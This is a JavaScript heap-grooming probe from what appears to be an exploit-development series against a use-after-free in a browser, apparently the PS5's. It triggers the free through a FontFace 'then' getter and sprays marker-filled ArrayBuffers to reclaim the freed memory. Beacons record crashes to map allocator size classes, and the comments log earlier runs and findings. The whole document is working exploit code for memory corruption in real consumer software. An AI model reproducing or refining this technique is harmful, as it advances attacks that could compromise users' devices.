// p458-massclaim — does VOLUME claim the freed slot when a single
// filler of the same size never does?
// Beacon prefix: V458- (MASS- tags)
//
// Evidence: single ArrayBuffer fillers at 8..1536 NEVER claim the slot
// (1839 beacons, ~600 runs, zero kills), yet p446's spray of 280 mixed
// buffers DID claim it (marker death 18/18). Difference is volume:
// the freed block is evidently not at the free-list head, so the Nth
// same-class allocation is what reaches it.
//
// Method: per run, after the free, spray exactly 64 ArrayBuffers of
// ONE size k (marker-filled), and NO FontFaces — a clean binary:
//   process dies after K-GO   -> k is in the wrapper's size class
//   round completes (SURVIVED) -> k is not
// Sizes = p446's exact proven mix, one per run, cycling via localStorage.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V458-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var SIZES = [96, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 1024, 1280, 1536];
  var N = 64;

  var k;
  try { k = parseInt(localStorage.getItem('p458mk') || '96', 10); } catch(e) { k = 96; }
  if (SIZES.indexOf(k) < 0) k = SIZES[0];
  var next = SIZES[(SIZES.indexOf(k) + 1) % SIZES.length];
  try { localStorage.setItem('p458mk', String(next)); } catch(e) {}

  B('BOOT-mk' + k);

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);
  hb.textContent = 'p458-massclaim k=' + k + ' x' + N + ' armed';

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var bufs = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        for (var i = 0; i < N; i++) {
          var buf = new ArrayBuffer(k);
          var u8 = new Uint8Array(buf);
          u8[0] = 0x46; u8[1] = 0x34; u8[2] = 0x34; u8[3] = 0x56;  // V44V marker
          u8[4] = i;
          bufs.push(u8);
        }
      }
      return undefined;
    },
    configurable: true
  });

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round0() {
    B('MK' + k + '-GO');
    hb.textContent = 'p458-massclaim k=' + k + ' x' + N + ' RUNNING';
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE-RELOAD'); setTimeout(reload, 2000); return; }

    void face.loaded;
    face.load().then(
      function() {
        // survived: the confused dispatch either never ran or ran on a
        // buffer with marker vtable -> would have died. Reaching here
        // means k is NOT in the class (or dispatch missed).
        B('MK' + k + '-SURVIVED');
        hb.textContent = 'p458-massclaim k=' + k + ' SURVIVED (reload)';
        // memory hygiene: the PS5 browser process has a hard cap and
        // reload churn without cleanup triggers the console's
        // "not enough free system memory" error. Explicitly release
        // everything we allocated before the next round, and cool down
        // periodically so the system can reclaim.
        cleanup();
        var runs = 0;
        try {
          runs = (parseInt(localStorage.getItem('p458runs') || '0', 10) + 1) % 40;
          localStorage.setItem('p458runs', String(runs));
        } catch(e) {}
        if (runs === 0) {
          B('COOLDOWN-60s');
          hb.textContent = 'p458-massclaim COOLDOWN 60s (mem)';
          setTimeout(reload, 60000);
        } else {
          setTimeout(reload, 3000);
        }
      },
      function(e) { B('MK' + k + '-NO-0-RELOAD'); setTimeout(reload, 2000); }
    );
  }

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
    } catch(e) {}
    bufs = null;
  }

  function reload() {
    location.replace(location.pathname.indexOf('massclaim') >= 0
      ? 'fa-v458-massclaim.html?r=' + Date.now()
      : 'fa-v458-massclaim.html?r=' + Date.now());
  }

  round0();
  setTimeout(function() {
    B('WATCHDOG-mk' + k);
    reload();
  }, 30000);
})();
